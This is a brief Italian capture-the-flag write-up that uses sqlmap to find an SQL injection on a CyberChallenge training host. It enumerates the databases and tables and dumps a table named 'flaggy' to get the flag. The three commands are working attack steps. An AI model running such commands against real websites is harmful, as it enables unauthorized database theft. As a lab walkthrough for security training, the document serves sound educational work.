Uso sqlmap per testare vulnerabilità di SQL injection

```jsx
sqlmap -u "http://filtered.challs.cyberchallenge.it/post.php?id=*" --dbs
```

- -u specifica l’url
- * indica dove sqlmap deve testare l’iniezione
- — dbs elenca i database disponibili

SQLMap trova il database chiamato filtered.

```jsx
sqlmap -u http://149.202.200.158:5111/post.php?id=* -D filtered --tables
```

Con questo comando sqlmap enumera tutte le tabelle presenti nel database filtered

```jsx
sqlmap -u http://149.202.200.158:5111/post.php?id=* -D filtered -T flaggy --dump
```

Con questo comando estraggo i dati dalla tabella flaggy